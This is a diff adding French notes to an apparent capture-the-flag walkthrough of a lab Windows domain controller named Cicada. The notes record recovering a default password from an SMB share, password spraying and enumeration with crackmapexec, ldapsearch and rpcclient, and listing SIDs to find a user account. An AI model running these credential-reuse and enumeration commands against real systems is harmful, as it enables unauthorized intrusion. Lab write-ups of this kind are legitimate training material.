@@ -118,6 +118,116 @@ smbclient //10.10.11.35/HR -N
 
 Au sein de DEV on peut rien faire mais dans HR on trouve un fichier
 
-J'arrive pas à récupérer le fichier
+Dans ce fichier on trouve un mdp par défaut Cicada$M6Corpb*@Lp#nZp!8
 
+On retente enum4linux avec l'option -p afin de renseigner le mdp et d'avoir plus d'info (possiblement un user)
+
+ça marche ap
+
+On tente la commande suivante pour la même chose:
+
+crackmapexec smb 10.10.11.35 -u '' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
+
+[*] First time use detected
+[*] Creating home directory structure
+[*] Creating default workspace
+[*] Initializing LDAP protocol database
+[*] Initializing RDP protocol database
+[*] Initializing SSH protocol database
+[*] Initializing FTP protocol database
+[*] Initializing WINRM protocol database
+[*] Initializing SMB protocol database
+[*] Initializing MSSQL protocol database
+[*] Copying default configuration file
+[*] Generating SSL certificate
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\:Cicada$M6Corpb*@Lp#nZp!8 
+SMB         10.10.11.35     445    CICADA-DC        [-] Error enumerating domain users using dc ip 10.10.11.35: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+SMB         10.10.11.35     445    CICADA-DC        [*] Trying with SAMRPC protocol
+
+La réponse montre que l'on a réussi a s'authentifier avec le mdp mais que l'on a pas réussi à énumérer les users
+
+On va donc essayer de juste s'authentifier à DEV via la commande suivante :
+
+smbclient //10.10.11.35/DEV -U 'cicada.htb\Cicada%Cicada$M6Corpb*@Lp#nZp!8'
+
+On se connecte mais on peut rien faire
+
+crackmapexec smb 10.10.11.35 -u "Cicada" -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
+
+On peut rien faire pour accéder au fichier de dev mais on teste d'autres commandes
+
+crackmapexec rdp 10.10.11.35 -u "Cicada" -p 'Cicada$M6Corpb*@Lp#nZp!8'
+
+crackmapexec winrm 10.10.11.35 -u "Cicada" -p 'Cicada$M6Corpb*@Lp#nZp!8'
+
+SMB         10.10.11.35     5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
+HTTP        10.10.11.35     5985   CICADA-DC        [*] http://10.10.11.35:5985/wsman
+WINRM       10.10.11.35     5985   CICADA-DC        [-] cicada.htb\Cicada:Cicada$M6Corpb*@Lp#nZp!8
+
+Le résultat montre que winrm est exposé sur le port 5985 mais que le login Cicada n'est pas bon
+
+On va donc tester d'autres users
+
+crackmapexec winrm 10.10.11.35 -u "Cicada" -p 'Cicada$M6Corpb*@Lp#nZp!8'
+
+J'en ai testé plusieurs mais rien fonctionne
+
+ldapsearch -x -H ldap://10.10.11.35 -D "cicada.htb\cicada" -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "dc=cicada,dc=htb"
+
+rpcclient -U 'Cicada%Cicada$M6Corpb*@Lp#nZp!8' 10.10.11.35
+
+La commande rpcclient -U "" 10.10.11.35 en donnant le mdp fonctionne
+
+On liste les sid présent sur le serv avec la commande suivante :
+
+S-1-5-90-0
+S-1-5-9
+S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420
+S-1-5-80-0
+S-1-5-6
+S-1-5-32-559
+S-1-5-32-554
+S-1-5-32-551
+S-1-5-32-550
+S-1-5-32-549
+S-1-5-32-548
+S-1-5-32-545
+S-1-5-32-544
+S-1-5-21-917908876-1423158569-3159038727-1601
+S-1-5-21-917908876-1423158569-3159038727-1109
+S-1-5-20
+S-1-5-19
+S-1-5-18
+S-1-5-11
+S-1-1-0
+
+Avec la commande lookupsid [id] on regarde les noms des comptes
+
+S-1-5-90-0 Window Manager\Window Manager Group (5)
+S-1-5-9 NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS (5)
+S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420 NT SERVICE\WdiServiceHost (5)
+S-1-5-80-0 NT SERVICE\ALL SERVICES (5)
+S-1-5-6 NT AUTHORITY\SERVICE (5)
+S-1-5-32-559 BUILTIN\Performance Log Users (4)
+S-1-5-32-554 BUILTIN\Pre-Windows 2000 Compatible Access (4)
+S-1-5-32-551 BUILTIN\Backup Operators (4)
+S-1-5-32-550 BUILTIN\Print Operators (4)
+S-1-5-32-549 BUILTIN\Server Operators (4)
+S-1-5-32-548 BUILTIN\Account Operators (4)
+S-1-5-32-545 BUILTIN\Users (4)
+S-1-5-32-544 BUILTIN\Administrators (4)
+S-1-5-21-917908876-1423158569-3159038727-1601 CICADA\emily.oscars (1)
+S-1-5-21-917908876-1423158569-3159038727-1109 CICADA\Dev Support (2)
+S-1-5-20 NT AUTHORITY\NETWORK SERVICE (5)
+S-1-5-19 NT AUTHORITY\LOCAL SERVICE (5)
+S-1-5-18 NT AUTHORITY\SYSTEM (5)
+S-1-5-11 NT AUTHORITY\Authenticated Users (5)
+S-1-1-0 \Everyone (5)
+
+On a donc réussi a choper un login (emily.oscars)
+
+J'essaie de me co avec emily
+
+smbclient -U 'cicada.htb\emily.oscars%Cicada$M6Corpb*@Lp#nZp!8' //10.10.11.35/HR
 
